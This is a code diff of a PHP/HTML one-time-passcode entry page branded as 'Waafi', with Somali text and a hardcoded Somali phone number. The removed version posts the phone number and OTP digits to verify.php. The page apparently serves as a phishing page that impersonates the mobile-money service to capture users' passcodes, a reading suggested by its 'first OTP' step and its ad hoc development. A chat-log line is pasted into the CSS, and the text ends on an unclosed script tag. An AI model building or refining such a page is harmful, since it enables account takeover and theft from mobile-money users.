@@ -14,7 +14,6 @@ if(empty($phone)){
     exit();
 }
 ?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -36,7 +35,6 @@ body {
     justify-content: space-between;
     align-items: center;
     padding: 15px;
-    color: #333;
     background: #fff;
 }
 
@@ -55,10 +53,6 @@ body {
     box-shadow: 0 4px 10px rgba(0,0,0,0.1);
 }
 
-.container h2 {
-    margin-bottom: 10px;
-}
-
 .phone {
     font-weight: bold;
     margin: 10px 0 20px;
@@ -72,16 +66,17 @@ body {
     margin: 20px 0;
 }
 
-.otp {
-   width: 50px;
-    height: 50px;
-    border: 2px solid #6cc04a;
-    border-radius: 10px;
+.otp-box input {
+    width: 45px;
+    height: 55px;
     text-align: center;
     font-size: 20px;
+    border: 2px solid #4CAF50;
+    border-radius: 10px;
+    outline: none;
 }
 
-/* RESEND TEXT */
+/* RESEND */
 .resend {
     margin: 10px 0;
     color: #777;
@@ -93,133 +88,122 @@ body {
     cursor: pointer;
 }
 
+/* BUTTON */
+button {
+    width: 100%;
+    padding: 15px;
+    background: #ccc;
+    border: none;
+    border-radius: 10px;
+    font-size: 16px;
+    color: #fff;
+    transition: 0.3s;
+}
 
-/* FOOTER CURVE */
+button.active {
+    background: #4CAF50;
+}
+
+/* FOOTER */
 .footer {
     margin-top: 80px;
     text-align: center;
     color: white;
     padding: 30px;
 }
-[9:28 PM, 4/20/2026] Denno Netifytech: /* OTP container */
-.otp-container {
-    display: flex;
-    justify-content: center;
-    gap: 10px;
-    margin: 20px 0;
-}
-
-/* Each OTP box */
-.otp {
-    width: 45px;
-    height: 45px;
-    border: 2px solid #4CAF50;
-    border-radius: 10px;
-    text-align: center;
-    font-size: 20px;
-    outline: none;
-}
-button {
-    width: 100%;
-    padding: 15px;
-    border: none;
-    border-radius: 10px;
-    background: #ccc;
-    color: white;
-    font-size: 16px;
-    margin-top: 20px;
-}
 </style>
 </head>
 
 <body>
 
-<!-- HEADER -->
 <div class="header">
     <span>←</span>
     <h2>Waafi</h2>
     <span>☰</span>
 </div>
 
-<!-- MAIN CARD -->
 <div class="container">
 
     <h2>Xaqiijinta OTP-ga Kowaad</h2>
 
     <p>Geli OTP-ga kowaad ee loogu diray lambarka taleefankaaga</p>
 
-<h3>+252 <?php echo $phone; ?></h3>
+    <div class="phone">+252637392227</div>
 
-<form id="otpForm" action="verify.php" method="POST">
+    <!-- OTP INPUTS -->
+    <div class="otp-box" id="otpBox">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+    </div>
 
-<input type="hidden" name="id" value="<?php echo $id; ?>">
-<input type="hidden" name="phone" value="<?php echo $phone; ?>">
+    <div class="resend">
+        Koodka ma helin? <span id="resend">Mar kale dir</span>
+    </div>
 
-<div class="otp-container">
-    <input type="text" maxlength="1" class="d1">
-    <input type="text" maxlength="1" class="d2">
-    <input type="text" maxlength="1" class="d3">
-    <input type="text" maxlength="1" class="d4">
-    <input type="text" maxlength="1" class="d5">
-    <input type="text" maxlength="1" class="d6">
-</div>
-
-<button type="submit">XAQIIJI OTP-GA KOWAAD</button>
-<p id="timer">Resend otp in 30s</p>
-
-<button id="resendBtn" disabled>resend otp</button>
-
-</form>
+    <button id="submitBtn" disabled>XAQIIJI OTP-GA KOWAAD</button>
 
 </div>
-<!-- FOOTER -->
+
 <div class="footer">
     © 2026 Waafi Soomaaliya
 </div>
 
-</body>
-</html>
 <script>
-const inputs = document.querySelectorAll('.otp-boxes input');
+const inputs = document.querySelectorAll(".otp-box input");
+const button = document.getElementById("submitBtn");
 
-// AUTO MOVE + BACKSPACE
+// AUTO MOVE + VALIDATION
 inputs.forEach((input, index) => {
 
-    input.addEventListener('input', (e) => {
-        let value = e.target.value;
-
-        // allow only numbers
-        e.target.value = value.replace(/[^0-9]/g, '');
+    input.addEventListener("input", (e) => {
+        let value = e.target.value.replace(/[^0-9]/g, "");
+        e.target.value = value;
 
         if (value && index < inputs.length - 1) {
             inputs[index + 1].focus();
         }
+
+        checkFilled();
     });
 
-    input.addEventListener('keydown', (e) => {
+    input.addEventListener("keydown", (e) => {
         if (e.key === "Backspace" && !input.value && index > 0) {
             inputs[index - 1].focus();
         }
     });
-
 });
 
+// ENABLE BUTTON WHEN FULL
+function checkFilled() {
+    let filled = [...inputs].every(input => input.value !== "");
+    
+    if (filled) {
+        button.disabled = false;
+        button.classList.add("active");
+    } else {
+        button.disabled = true;
+        button.classList.remove("active");
+    }
+}
 
-// 🔥 PASTE FULL OTP (IMPORTANT FEATURE)
-document.querySelector('.otp-boxes').addEventListener('paste', (e) => {
-
+// PASTE FULL OTP
+document.getElementById("otpBox").addEventListener("paste", (e) => {
     e.preventDefault();
 
-    let pasteData = (e.clipboardData || window.clipboardData).getData('text');
+    let paste = (e.clipboardData || window.clipboardData)
+        .getData("text")
+        .replace(/[^0-9]/g, "")
+        .slice(0, inputs.length);
 
-    pasteData = pasteData.replace(/[^0-9]/g, '').slice(0, inputs.length);
-
-    pasteData.split('').forEach((char, index) => {
-        if (inputs[index]) {
-            inputs[index].value = char;
-        }
+    paste.split("").forEach((num, i) => {
+        if (inputs[i]) inputs[i].value = num;
     });
 
+    checkFilled();
 });
 </script>
 <script>
